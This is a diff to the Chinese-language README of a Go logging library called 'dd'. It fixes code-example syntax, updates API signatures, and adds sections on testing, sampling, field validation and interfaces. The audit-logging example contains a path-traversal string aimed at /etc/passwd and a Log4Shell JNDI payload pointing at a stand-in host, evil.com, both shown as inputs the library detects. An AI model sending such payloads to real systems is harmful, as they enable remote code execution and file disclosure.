@@ -16,7 +16,7 @@
 ## ✨ 核心特性
 | 特性 | 说明 |
 |------|------|
-| 🚀 **高性能** | 篮单日志 310 万/秒,针对高吞吐场景优化 |
+| 🚀 **高性能** | 简单日志 310 万/秒,针对高吞吐场景优化 |
 | 🔒 **线程安全** | 原子操作 + 无锁设计,完全并发安全 |
 | 🛡️ **内置安全** | 敏感数据过滤、注入攻击防护 |
 | 📊 **结构化日志** | 类型安全字段、 JSON/文本格式,可自定义字段名 |
@@ -143,7 +143,7 @@ cfg.File = &dd.FileConfig{
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 defer logger.Close()
 ```
 
@@ -192,7 +192,7 @@ cfg.JSON.PrettyPrint = true  // 开发环境美化输出
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 ```
 
 ---
@@ -205,12 +205,12 @@ cfg.Security = dd.DefaultSecurityConfig()  // 启用基础过滤
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 
 // 自动过滤
 logger.Info("password=secret123")           // → password=[REDACTED]
 logger.Info("api_key=sk-abc123")            // → api_key=[REDACTED]
-logger.Info("credit_card=453201511283366") // → credit_card=[REDACTED]
+logger.Info("credit_card=4532015112830366") // → credit_card=[REDACTED]
 logger.Info("email=user@example.com")       // → email=[REDACTED]
 ```
 
@@ -250,7 +250,7 @@ cfg.Security = &dd.SecurityConfig{
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 ```
 
 ### 禁用安全过滤(最高性能)
@@ -355,9 +355,7 @@ entry := logger.WithFields(
     dd.String("trace_id", dd.GetTraceID(ctx)),
     dd.String("span_id", dd.GetSpanID(ctx)),
 )
- entry.InfoWith("处理请求", dd.String("user", "alice"))
-
-)
+entry.InfoWith("处理请求", dd.String("user", "alice"))
 
 // 模式 2: 使用辅助函数提取
 func extractTraceFields(ctx context.Context) []dd.Field {
@@ -382,7 +380,7 @@ logger.InfoWith("用户操作", append(traceFields,
 ```go
 tenantExtractor := func(ctx context.Context) []dd.Field {
     if tenantID := ctx.Value("tenant_id"); tenantID != nil {
-        return []dd.Field{dd.String("tenant_id", tenantID.(string)}
+        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
     }
     return nil
 }
@@ -392,7 +390,7 @@ cfg.ContextExtractors = []dd.ContextExtractor{tenantExtractor}
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 ```
 
 ---
@@ -404,19 +402,19 @@ hooks := dd.NewHooksFromConfig(dd.HooksConfig{
         func(ctx context.Context, hctx *dd.HookContext) error {
             fmt.Printf("日志前: %s\n", hctx.Message)
             return nil
-        }
+        },
     },
     AfterLog: []dd.Hook{
         func(ctx context.Context, hctx *dd.HookContext) error {
             fmt.Printf("日志后: %s\n", hctx.Message)
             return nil
-        }
+        },
     },
     OnError: []dd.Hook{
         func(ctx context.Context, hctx *dd.HookContext) error {
             fmt.Printf("错误: %v\n", hctx.Error)
             return nil
-        }
+        },
     },
 })
 
@@ -425,7 +423,7 @@ cfg.Hooks = hooks
 logger, err := dd.New(cfg)
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
-    }
+}
 ```
 
 ---
@@ -434,13 +432,14 @@ if err != nil {
 ```go
 // 创建审计日志器
 auditCfg := dd.DefaultAuditConfig()
-auditLogger := dd.NewAuditLogger(auditCfg)
+auditLogger, err := dd.NewAuditLogger(auditCfg)
+if err != nil { /* 处理错误 */ }
 defer auditLogger.Close()
 
 // 记录安全事件
 auditLogger.LogSensitiveDataRedaction("password=*", "password", "密码已脱敏")
-auditLogger.logPathTraversalAttempt("../../../etc/passwd", "路径遍历已阻止")
-auditLogger.logSecurityViolation("LOG4SHELL", "检测到可疑模式", map[string]any{
+auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "路径遍历已阻止")
+auditLogger.LogSecurityViolation("LOG4SHELL", "检测到可疑模式", map[string]any{
     "input": "${jndi:ldap://evil.com/a}",
 })
 ```
@@ -449,12 +448,14 @@ auditLogger.logSecurityViolation("LOG4SHELL", "检测到可疑模式", map[strin
 
 ## 📝 日志完整性
 ```go
-// 使用密钥创建签名器
-integrityCfg := dd.DefaultIntegrityConfig()
+// 使用自动生成的密钥创建签名器
+integrityCfg, err := dd.DefaultIntegrityConfigSafe()
+if err != nil { /* 处理错误 */ }
+
 signer, err := dd.NewIntegritySigner(integrityCfg)
 if err != nil {
     log.Fatalf("创建签名器失败: %v", err)
-    }
+}
 
 // 签名日志消息
 message := "关键审计事件"
@@ -477,6 +478,123 @@ if result.Valid {
 | JSON 格式 | **60 万/秒** | 800 B | 20 |
 | 级别检查 | **25 亿/秒** | 0 B | 0 |
 | 并发 (22 goroutines) | **6800 万/秒** | 200 B | 7 |
+
+---
+
+## 🧪 测试
+
+### LoggerRecorder
+
+使用 `LoggerRecorder` 在测试中捕获和断言日志输出:
+
+```go
+recorder := dd.NewLoggerRecorder()
+
+// 创建写入到 recorder 的 logger
+logger, err := recorder.NewLogger()
+if err != nil { /* 处理错误 */ }
+
+logger.InfoWith("用户登录",
+    dd.String("user_id", "123"),
+    dd.String("action", "login"),
+)
+
+// 断言捕获的条目
+fmt.Printf("总条目数: %d\n", recorder.Count())          // 1
+fmt.Printf("有条目: %v\n", recorder.HasEntries())        // true
+
+// 检查最后一条
+entry := recorder.LastEntry()
+fmt.Printf("级别: %v\n", entry.Level)      // Info
+fmt.Printf("消息: %s\n", entry.Message)    // "用户登录"
+
+// 搜索条目
+recorder.ContainsMessage("用户登录")           // true
+recorder.ContainsField("user_id")             // true
+recorder.GetFieldValue("user_id")             // "123"
+recorder.EntriesAtLevel(dd.LevelInfo)         // []LogEntry{...}
+```
+
+---
+
+## 🔬 高级功能
+
+### 日志采样
+
+在高吞吐场景下减少日志量:
+
+```go
+cfg := dd.DefaultConfig()
+cfg.Sampling = &dd.SamplingConfig{
+    Enabled:    true,
+    Initial:    100,              // 始终记录前 100 条
+    Thereafter: 10,               // 之后每 10 条记录 1 条
+    Tick:       time.Second,      // 每秒重置计数器
+}
+logger, err := dd.New(cfg)
+```
+
+### 字段验证
+
+强制字段键的命名规范:
+
+```go
+// 严格的 snake_case 验证
+logger.SetFieldValidation(dd.StrictSnakeCaseConfig())
+
+// 自定义验证
+fv := &dd.FieldValidationConfig{
+    Mode:                     dd.FieldValidationStrict,
+    Convention:               dd.NamingConventionSnakeCase,
+    AllowCommonAbbreviations: true,
+}
+logger.SetFieldValidation(fv)
+```
+
+### 动态级别解析
+
+根据运行时条件动态调整日志级别:
+
+```go
+var errorCount atomic.Int64
+
+logger.SetLevelResolver(func(ctx context.Context) dd.LogLevel {
+    if errorCount.Load() > 100 {
+        return dd.LevelWarn  // 高错误率下降低日志量
+    }
+    return dd.LevelDebug
+})
+```
+
+### 优雅关闭
+
+使用 `Shutdown` 进行带超时的安全关闭:
+
+```go
+logger, _ := dd.New(dd.DefaultConfig())
+defer func() {
+    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+    defer cancel()
+    if err := logger.Shutdown(ctx); err != nil {
+        fmt.Fprintf(os.Stderr, "日志器关闭错误: %v\n", err)
+    }
+}()
+```
+
+### 调试工具
+
+快速数据检查 (输出到 stdout, 不经过安全过滤):
+
+```go
+dd.Text(myStruct)                      // 格式化输出
+dd.Textf("值: %v", data)               // 格式化文本
+dd.JSON(myStruct)                      // 带调用者信息的 JSON
+dd.JSONF("结果: %v", data)             // 格式化 JSON
+
+// 也可通过 logger 实例调用
+logger.Text(myStruct)
+logger.JSON(myStruct)
+```
 
 ---
 
@@ -503,10 +621,41 @@ dd.ErrorWith(msg string, fields ...dd.Field)
 // ... DebugWith, WarnWith, FatalWith
 
 // 全局 logger 管理
-dd.InitDefault(cfg *Config) error    // 使用配置初始化默认 logger
+dd.InitDefault(cfg ...Config) error  // 使用配置初始化默认 logger
 dd.SetDefault(logger *Logger)
-dd.SetLevel(level LogLevel)
+dd.Default() *Logger                 // 获取默认 logger
+dd.DefaultWithErr() (*Logger, error) // 获取默认 logger 及初始化错误
+dd.DefaultInitError() error          // 检查默认初始化是否失败
+dd.SetLevel(level LogLevel) error
 dd.GetLevel() LogLevel
+
+// 级别检查函数
+dd.IsLevelEnabled(level LogLevel) bool
+dd.IsEnabled()  // IsDebugEnabled, IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
+
+// 通用级别日志
+dd.Log(level LogLevel, args ...any)
+dd.Logf(level LogLevel, format string, args ...any)
+dd.LogWith(level LogLevel, msg string, fields ...Field)
+
+// Print 函数 (经过安全过滤, 使用 LevelInfo)
+dd.Print(args ...any)
+dd.Println(args ...any)
+dd.Printf(format string, args ...any)
+
+// 字段链式 (包级)
+dd.WithFields(fields ...Field) *LoggerEntry
+dd.WithField(key string, value any) *LoggerEntry
+
+// 采样
+dd.SetSampling(config *SamplingConfig)
+dd.GetSampling() *SamplingConfig
+
+// 生命周期
+dd.Flush() error
+dd.AddWriter(w io.Writer) error
+dd.RemoveWriter(w io.Writer) error
+dd.WriterCount() int
 ```
 
 ### Logger 方法
@@ -518,10 +667,23 @@ logger.Info(args ...any)
 logger.Infof(format string, args ...any)
 logger.InfoWith(msg string, fields ...Field)
 
+// 通用级别日志
+logger.Log(level LogLevel, args ...any)
+logger.Logf(level LogLevel, format string, args ...any)
+logger.LogWith(level LogLevel, msg string, fields ...Field)
+
+// Print 方法 (经过安全过滤, 使用 LevelInfo)
+logger.Print(args ...any)
+logger.Println(args ...any)
+logger.Printf(format string, args ...any)
+
 // 级别管理
 logger.SetLevel(level LogLevel) error
 logger.GetLevel() LogLevel
 logger.IsLevelEnabled(level LogLevel) bool
+logger.IsDebugEnabled() bool    // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
+logger.SetLevelResolver(resolver LevelResolver)
+logger.GetLevelResolver() LevelResolver
 
 // Writer 管理
 logger.AddWriter(w io.Writer) error
@@ -531,24 +693,59 @@ logger.WriterCount() int
 // 生命周期
 logger.Flush() error
 logger.Close() error
+logger.Shutdown(ctx context.Context) error  // 带超时的优雅关闭
 logger.IsClosed() bool
 
 // 字段链式
 logger.WithFields(fields ...Field) *LoggerEntry
 logger.WithField(key string, value any) *LoggerEntry
+
+// 安全
+logger.SetSecurityConfig(config *SecurityConfig)
+logger.GetSecurityConfig() *SecurityConfig
+logger.ActiveFilterGoroutines() int32
+logger.WaitForFilterGoroutines(timeout time.Duration) bool
+
+// Context 提取器
+logger.AddContextExtractor(extractor ContextExtractor) error
+logger.SetContextExtractors(extractors ...ContextExtractor) error
+logger.GetContextExtractors() []ContextExtractor
+
+// 钩子
+logger.AddHook(event HookEvent, hook Hook) error
+logger.SetHooks(registry *HookRegistry) error
+logger.GetHooks() *HookRegistry
+
+// 采样
+logger.SetSampling(config *SamplingConfig)
+logger.GetSampling() *SamplingConfig
+
+// 字段验证
+logger.SetFieldValidation(config *FieldValidationConfig)
+logger.GetFieldValidation() *FieldValidationConfig
 ```
 
 ### 字段构造函数
 ```go
 dd.String(key, value string)
 dd.Int(key string, value int)
+dd.Int8(key string, value int8)
+dd.Int16(key string, value int16)
+dd.Int32(key string, value int32)
 dd.Int64(key string, value int64)
+dd.Uint(key string, value uint)
+dd.Uint8(key string, value uint8)
+dd.Uint16(key string, value uint16)
+dd.Uint32(key string, value uint32)
+dd.Uint64(key string, value uint64)
+dd.Float32(key string, value float32)
 dd.Float64(key string, value float64)
 dd.Bool(key string, value bool)
 dd.Time(key string, value time.Time)
 dd.Duration(key string, value time.Duration)
-dd.Err(err error)                    // 错误字段
-dd.ErrWithStack(err error)           // 廦堆栈信息的错误
+dd.Err(err error)                    // 错误字段 (键: "error")
+dd.ErrWithKey(key string, err error) // 自定义键的错误字段
+dd.ErrWithStack(err error)           // 带堆栈信息的错误
 dd.Any(key string, value any)        // 任意类型
 ```
 
@@ -575,6 +772,52 @@ dd.GetRequestID(ctx context.Context) string
 | `ToWriter(w)` | 单个 io.Writer |
 | `ToWriters(...w)` | 多个 io.Writer |
 
+### 依赖注入接口
+
+```go
+// CoreLogger - 基础日志方法
+type CoreLogger interface {
+    Debug/Info/Warn/Error/Fatal(args ...any)
+    Debugf/Infof/Warnf/Errorf/Fatalf(format string, args ...any)
+    DebugWith/InfoWith/WarnWith/ErrorWith/FatalWith(msg string, fields ...Field)
+    WithFields(fields ...Field) *LoggerEntry
+    WithField(key string, value any) *LoggerEntry
+}
+
+// LevelLogger - 增加级别管理
+type LevelLogger interface {
+    CoreLogger
+    GetLevel() LogLevel
+    SetLevel(level LogLevel) error
+    IsLevelEnabled(level LogLevel) bool
+    IsDebugEnabled() bool  // + IsInfoEnabled, IsWarnEnabled, IsErrorEnabled, IsFatalEnabled
+}
+
+// ConfigurableLogger - 增加 Writer、生命周期和配置方法
+type ConfigurableLogger interface {
+    CoreLogger
+    GetLevel() LogLevel
+    SetLevel(level LogLevel) error
+    AddWriter/RemoveWriter, Flush/Close/IsClosed
+    SetSecurityConfig/GetSecurityConfig
+    AddContextExtractor/SetContextExtractors/GetContextExtractors
+    AddHook/SetHooks/GetHooks
+    SetSampling/GetSampling
+}
+
+// LogProvider - 完整接口, 用于依赖注入和测试 (包含 Print/Text/JSON 调试方法)
+type LogProvider interface {
+    // 包含所有 CoreLogger, LevelLogger, ConfigurableLogger 方法
+    // 加调试工具: Print/Println/Printf, Text/Textf, JSON/JSONF
+    // 加过滤协程监控: ActiveFilterGoroutines/WaitForFilterGoroutines
+}
+
+// 在服务中使用:
+type Service struct {
+    logger dd.LogProvider
+}
+```
+
 ---
 
 ## 📁 示例代码
@@ -591,6 +834,7 @@ dd.GetRequestID(ctx context.Context) string
 | [08_production.go](examples/08_production.go) | 生产环境模式 |
 | [09_advanced.go](examples/09_advanced.go) | 采样、验证 |
 | [10_audit_integrity.go](examples/10_audit_integrity.go) | 审计、完整性 |
+| [11_testing.go](examples/11_testing.go) | 使用 LoggerRecorder 测试 |
 
 ---
 
